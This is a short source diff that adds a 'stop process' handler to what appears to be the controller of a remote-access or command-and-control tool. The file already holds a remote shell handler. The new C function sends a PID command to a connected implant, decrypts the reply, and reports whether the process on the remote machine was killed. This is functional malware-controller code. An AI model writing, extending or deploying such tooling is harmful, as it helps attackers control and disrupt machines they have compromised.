@@ -197,3 +197,52 @@ void HandleShell(char *cmd,int client_socket) {
 
  	return;
  }
+
+void HandleStopProcess(char *cmd, int client_socket){
+
+    char* space_pos = strchr(cmd, ' ');
+    if (space_pos == NULL) {
+        return;
+    }
+    //printf("[+] THE PID is %s\n", space_pos + 1);     //DEBUG
+
+    if (atoi(space_pos+1) == 0){
+        printf("[x] Invalid PID, please enter a valid value\n");
+        return;
+    }
+
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        printf("[x] send() failed\n");
+        return;
+    }
+
+    char recv_buf[BUFFER_SIZE] = {0};
+
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
+    if (bytes_received < 0) {
+        perror("[x] recv() failed\n");
+        exit(EXIT_FAILURE);
+    }
+
+    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
+    switch (atoi(recv_buf)){
+        case 1:
+            printf("[x] Can't get requested proc handle\n");
+            break;
+        case 2:
+            printf("[x] Can't terminate process\n");
+            break;
+        case 0:
+            printf("[+] process terminated successfully\n");
+            break;
+        default:
+            printf("[x] NO CASE MATCH, DEBUG MORE!\n");
+            break;
+    }
+
+    return;
+}
